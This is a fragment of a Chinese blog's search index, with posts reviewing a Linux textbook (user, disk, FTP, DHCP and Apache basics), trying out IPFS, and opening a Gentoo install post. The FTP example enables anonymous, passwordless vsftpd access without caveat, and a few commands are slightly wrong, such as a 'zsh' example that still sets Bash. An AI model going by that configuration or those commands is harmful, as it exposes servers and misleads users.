","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:3:0","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"用户和组的管理 安装 Arch 的时候要干的事，就是用 useradd 添加用户。 桌面系统往往不使用 root 用户， 会添加一个或多个普通用户。 有些多人协作部署的服务器也会利用 Linux 多用户的特性。 提示 GNU/Linux 系统中的每一个文件都从属一个用户（属主）和一个用户组（属组）。另外，还有三种类型的访问权限：读（read）、写（write）、运行（execute）。我们可以针对文件的属主、属组、而设置相应的访问权限。 —— 摘自\u0026\u0026详见 ArchWiki ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:4:0","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"useradd 这个命令用来添加用户 useradd [选项] 用户名 先把参数用法贴上 -m / --create-home 创建用户主目录/home/[用户名]；在自己的主目录内，即使不是root用户也可以读写文件、安装程序等等。 -G / --groups 用户要加入的附加组列表；使用逗号分隔多个组，不要添加空格；如果不设置，用户仅仅加入初始组。 -s / --shell 用户默认登录shell的路径；启动过程结束后，默认启动的登录shell在此处设定；请确保使用的shell已经安装，默认是 Bash。 提示 使用 useradd --defaults 可以查看 shell 的默认值。默认是 Bash。使用 -s / --shell 选项可以设置其他值。/etc/shells 记录了可以使用的登录 shell。 —— 摘自 ArchWiki 比如我要在一个新机器上创建一个用户，用户名为 weepingdogel 且需要创建用户主目录 /home/weepingdogel， 而且加入到 wheel 这个组 ,默认 shell 设置为 Bash 。 我就会执行这条命令： useradd -G wheel -m -s /bin/bash weepingdogel 那如果我要 zsh 呢？ useradd -G wheel -m -s /bin/bash weepingdogel 就像这样咯～ 警告 新增用户不能与已存在用户的用户名相同; 用户创建后，用户名或组需被 /etc/sudoers 文件包含，否则无法使用 sudo 调取 root 权限; 别瞎j8乱创建一堆没卵用的用户 请确保使用的shell已经安装，默认是 Bash。 没装上的 shell 没法用，用户创建不了。 ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:4:1","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"userdel 这个命令用来删除用户 userdel [选项] 用户名 加上 -r 选项可以一并删除用户主目录 userdel -r 用户名 警告 别瞎j8乱删用户 没什么好说的，详见 man userdel 。 ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:4:2","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"groups 这个命令用来查看用户属于哪些组。 groups [用户名] 当然我们也可以通过查看 /etc/group 来查看所有组。 cat /etc/group ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:4:3","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"id 这个命令可以显示用户的一些额外信息，比如 UID 、 GID 等等。 id [用户名] ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:4:4","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"groupadd 和 groupdel 前者是创建新组，后者是删除一个组。 创建一个新组： groupadd [组名] 删除一个用户组： groupdel [组名] 警告 别瞎j8乱删组 ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:4:5","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"groupmod 往往用来更改用户所属组的名字，但不变更 GID。 groupmod -n [新名字] [旧名字] ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:4:6","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"gpasswd 往往用来变更用户所属于哪个组的情况。 比如将某个用户添加到某个组： gpasswd -a [用户名] [组名] 或者将用户从某个组中移除： gpasswd -d [用户名] [组名] 其他的用法也可以参考 man gpasswd 提示 如果用户已经处于登录状态，必须重新登录才能更改生效。 ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:4:7","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"一些相关文件列表 /etc/shadow 保存用户安全信息 /etc/passwd 用户账户信息 /etc/gshadow 保存组账号的安全信息 /etc/group 定义用户所属的组 /etc/sudoers 可以运行 sudo 的用户 /home/* 主目录 要好好记住它们。 ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:4:8","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"基本磁盘管理 当然也涉及到了磁盘的管理，这个其实在安装 Arch 的时候就能接触不少。 ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:5:0","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"查看分区情况 当 Linux 识别到磁盘，就会将其分配为一个块设备， 在系统里是个文件，比如 /dev/sda、/dev/nvme0n1 或 /dev/mmcblk0。可以使用 lsblk 或者 fdisk 查看： fdisk -l 提示 不同的设备当中，磁盘的块设备表示也不同，比如使用 SATA 接口的硬盘会被显示为 /dev/sd*X， 而使用 NVME 硬盘则会显示为 /dev/nvme*n* ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:5:1","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"创建编辑分区 你可以去搜索引擎找 fdisk 的说明，按照它来创建、编辑分区，可以用简单的 cfdisk。 甚至可以用一些发行版自带的图形化分区工具。 ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:5:2","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"格式化 分区创建好以后，就要选择合适的文件系统来进行格式化。 文件系统有哪些？具体可以参考这个页面 Linux 往往用 EXT4 使用 mkfs mkfs.ext4 /dev/partition 挂载分区 mount [被挂载的分区] [要挂载到的地方] 当然也可以写 /etc/fstab 来进行自动挂载，详情可以看这里 ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:5:3","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"资源共享服务 ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:6:0","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"FTP 搭建 FTP 服务器 首先使用包管理器安装 vsftpd deb sudo apt install vsftpd centos sudo yum install vsftpd 通过编辑 /etc/vsftpd.conf 来配置 比如允许匿名登录，以及允许无密码登录 anonymous_enable=YES no_anon_password=YES 然后通过 systemd 启动 sudo systemctl start vsftpd 通过客户端连接 参考Arch Wiki， 可根据实际情况调整配置。 ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:6:1","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"Samba 不搞这玩意，太危险了。 ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:6:2","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"DHCP 服务器 直接安装 dhcpd deb sudo apt install dhcpd centos yum install -y dhcpd pacman sudo pacman -S dhcpd 写配置文件 /etc/dhcpd.conf: # No DHCP service in DMZ network (192.168.2.0/24) subnet 192.168.2.0 netmask 255.255.255.0 然后通过 systemd 来启动服务 sudo systemctl start dhcpd4 ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:7:0","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"DNS 服务器 懒得搞了，不难 参考 https://wiki.archlinux.org/title/BIND_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87) ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:8:0","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"Apache 服务器 这个简单 deb sudo apt install apache2 pacman sudo pacman -S apache rpm sudo yum install -y apache2 直接启动服务 sudo systemctl start httpd 然后访问 http://127.0.0.1:80就行。 总结 什么垃圾书！ 很简单，但是太老了，跟不上时代了。 还是自己去网上找资料来得快。 ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:9:0","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"Web 3.0 时代的先驱者。","date":"2022-08-12","objectID":"/zh-cn/posts/%E8%AF%95%E7%8E%A9ipfs/","tags":["IPFS","通信协议","Web","网络","去中心化","文件传输"],"title":"试玩 IPFS 协议——Web3.0时代的先驱者。","uri":"/zh-cn/posts/%E8%AF%95%E7%8E%A9ipfs/"},{"categories":null,"content":"这个 LOGO 真好看。 IPFS 是什么啊？ IPFS(InterPlanetary File System), 听名字一看好像是个文件系统？ 翻译过来是星际文件系统，听起来是不是很高级？ 实际上它能实现的功能远比文件系统强大。 官方描述 IPFS is a collection of protocols, packages, and specifications that allow computers to send and receive data. Because of this, users can pick and choose which packages to install when using IPFS. And like shoe sizes, there is no one-size-fits-all solution. A developer building network applications will install a different set of tools than someone who wants to store files on IPFS. Pick the one that best suits what you’re here to do. 如果你康得懂英文就很容易明白它是啥了，如果你康不懂那就来翻译一下。 IPFS 是允许计算机发送和接收数据的协议、包和规范的集合。 因此，用户可以在使用 IPFS 时选择要安装的软件包。 和鞋码一样，没有一种万能的解决方案。 构建网络应用程序的开发人员将安装一组不同的工具，而不是想要在 IPFS 上存储文件的人。 选择最适合您在这里做的事情。 （Google Translate） 其实它的原理和BT差不多，具有去中心化的性质，这可能会加速从 Web2.0 时代到 Web3.0 时代的过程。 它可能会带头颠覆之前 Web2.0 时代所有的开发逻辑。因为这是比 http 还底层的协议，它可不仅仅是让你能够通过 BT 下载好康的那么简单，而且它可以让一切信息都用去中心化的方式传输。 因此我对它挺有兴趣的，今天就来玩一下。 我能怎么玩？ 对于目前这么菜的我来说，可以先试试官方文档写好了的玩法， 233。 ","date":"2022-08-12","objectID":"/zh-cn/posts/%E8%AF%95%E7%8E%A9ipfs/:0:0","tags":["IPFS","通信协议","Web","网络","去中心化","文件传输"],"title":"试玩 IPFS 协议——Web3.0时代的先驱者。","uri":"/zh-cn/posts/%E8%AF%95%E7%8E%A9ipfs/"},{"categories":null,"content":"安装 在一切开始之前我得先把 IPFS 安装上去。 我们可以选择多种安装方案。 阅读 IPFS 官方文档的 Install 部分 桌面用户（如 Windows、Mac、Linux）可以使用 IPFS Desktop，可以通过阅读官方文档中的教程进行安装和配置。 同样 Linux 也可以使用 然而 Arch 需要通过 aur 才能安装 ipfs-desktop 这个包，因此我决定安装命令行版本的 ipfs。 根据官方文档的教程 我们需要用 wget 下载一个叫 kubo 的包： Download the Linux binary from dist.ipfs.tech (opens new window). wget https://dist.ipfs.tech/kubo/v0.14.0/kubo_v0.14.0_linux-amd64.tar.gz 然后要进行解压、复制文件等一系列繁琐的操作，然而咱用 Arch 的就别吃这一套了。因为咱官方的仓库就有这个包 打开你的终端，用 pacman 找一下这个包: sudo pacman -Ss kubo 接下来你的终端就会返回类似于这样的信息: community/kubo 0.14.0-1 A peer-to-peer hypermedia distribution protocol 装它就完事了！ sudo pacman -S kubo 接下来我们就可以愉快的使用 ipfs 了，哈哈！ 这就是咱 Arch 用户的优越性！！！ 然后我们开始部署 ipfs，将自己的机器作为 ipfs 的节点～！ ipfs init ipfs daemon 接下来我们用 Brave 浏览器打开 WebUI : http://127.0.0.1:5001/webui 然后你就能看到这个界面了: 是不是超简单！ 另外，推荐使用 brave 浏览器来访问 IPFS 服务，毕竟它原生支持 IPFS 网关！ ","date":"2022-08-12","objectID":"/zh-cn/posts/%E8%AF%95%E7%8E%A9ipfs/:1:0","tags":["IPFS","通信协议","Web","网络","去中心化","文件传输"],"title":"试玩 IPFS 协议——Web3.0时代的先驱者。","uri":"/zh-cn/posts/%E8%AF%95%E7%8E%A9ipfs/"},{"categories":null,"content":"文件传输 在当前 Web 2.0 的模式下，我们传输文件必须经过一些大公司的商业网盘，传输速度和存储空间都会得到一定程度的限制。 而使用 IPFS 传输文件则不会受这些限制，除此之外还能规避很大一部分的审查。 使用 IPFS 传输文件也非常简单，只需要使用 WebUI 进行操作即可。 首先点击 “文件”： 再点击右上角的导入： 发送文件者可以点击 文件 或 文件夹 来导入要分享出去的文件，这时浏览器会自动弹出系统或DE自带的目录选择器，找到需要分享的文件即可。 然后点击对应文件右边的三个点： 选择复制 CID，然后将 CID 发给接受者。 而接受者则点击来自 IPFS 路径。 将 CID 复制粘贴进去就能将它导入到 WebUI 的文件列表了。 图形化操作，非常简单。 我随便找来几个文件测试了一下，在节点距离较近的情况下传输速度非常惊人。 而在远距离的情况下，速度略有逊色，但很稳定。至少比某些商业网盘的速度要快多了，而且这是免费的。 ","date":"2022-08-12","objectID":"/zh-cn/posts/%E8%AF%95%E7%8E%A9ipfs/:2:0","tags":["IPFS","通信协议","Web","网络","去中心化","文件传输"],"title":"试玩 IPFS 协议——Web3.0时代的先驱者。","uri":"/zh-cn/posts/%E8%AF%95%E7%8E%A9ipfs/"},{"categories":null,"content":"网页 IPFS 也是可以用来展示网页的，而且非常简单！ 这里是个简单的玩法。 首先编写一个 HTML 文件。 \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"\u003e \u003ctitle\u003eHello! IPFS!\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1 style=\"font-size: 100px;\"\u003eHello! IPFS!!\u003c/h1\u003e \u003c/body\u003e \u003c/html\u003e 保存，用和文件传输相同的方法把 index.html 导入自己的 IPFS 节点。 接下来同样点击文件最右边的三个点，与之前不同的是，这次我们要点击的是第一个按钮，分享链接。 然后用 Brave 浏览器直接访问链接。 页面成功打开，这时候我们发现地址栏开头写的协议既不是 HTTP 也不是 HTTPS，而是 ipfs:// 由此可见，这个网页是通过 IPFS 协议打开的： 像这样点对点协议建立的网站是可以有效规避审查的，内容也会更加丰富。 对未来有什么影响？ 就目前来看， IPFS 节点和用户都比较少，还处于一个冷门阶段。 但是通过我这么菜的试玩，可以看出在文件传输和网页搭建这两个方面 IPFS 是非常优秀的。 唯一想说的是， 在目前全世界节点不足一千的情况下，下载速度最慢最慢都能稳定在1MB/s左右，而某商业网盘运营十几年下载速度却只有9kb/s。 实在是想不到别的理由来拒绝 IPFS 的怀抱了。 也许有一天 IPFS 能火起来，节点数量能增加到 70 亿，那个时候，资源的获取和分享将会更加自由和高效吧。 除此之外，如果用 IPFS 来干一些更能满足需求的事情，一切去中心化，将会对 Web 2.0 时代的巨头们造成一次沉重的打击。 还在想什么呢，赶紧在本地搭一个 IPFS 节点试试看？也许你会想用 IPFS 整一些有意思的活？在评论区留言吧。 参考链接 星际文件系统 - 维基百科，自由的百科全书 IPFS Documentation | IPFS Docs InterPlanetary File System - ArchWiki ","date":"2022-08-12","objectID":"/zh-cn/posts/%E8%AF%95%E7%8E%A9ipfs/:3:0","tags":["IPFS","通信协议","Web","网络","去中心化","文件传输"],"title":"试玩 IPFS 协议——Web3.0时代的先驱者。","uri":"/zh-cn/posts/%E8%AF%95%E7%8E%A9ipfs/"},{"categories":["Linux"],"content":"给低性能设备白嫖高性能CPU编译系统的一种尝试。","date":"2022-06-11","objectID":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/","tags":["Gentoo","rsync","教程","尝试","编译","安装"],"title":"利用 rsync 给笔记本安装 Gentoo","uri":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/"},{"categories":["Linux"],"content":"序 半年不见，甚是想念～ 我有一台性能羸弱不堪的 